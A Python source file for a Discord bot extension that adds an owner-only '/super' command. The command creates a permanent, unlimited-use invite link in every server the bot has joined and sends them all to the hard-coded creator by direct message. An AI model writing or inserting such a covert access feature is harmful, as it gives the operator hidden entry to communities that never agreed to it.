import discord
from discord.ext import commands
from discord import app_commands

# Replace this with the actual bot creator's ID
BOT_CREATOR_ID = 486652069831376943

class SuperCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="super", description="Create invite links for all servers the bot is in.")
    async def super_command(self, interaction: discord.Interaction):
        if interaction.user.id != BOT_CREATOR_ID:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        invite_links = []
        for guild in self.bot.guilds:
            text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
            if text_channel:
                try:
                    invite = await text_channel.create_invite(max_age=0, max_uses=0)
                    invite_links.append(f"{guild.name}: {invite.url}")
                except discord.Forbidden:
                    invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
            else:
                invite_links.append(f"{guild.name}: No suitable text channel found")

        creator = await self.bot.fetch_user(BOT_CREATOR_ID)
        if creator:
            dm_message = "\n".join(invite_links)
            await creator.send(f"Here are the invite links for all servers:\n{dm_message}")

        await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(SuperCog(bot))
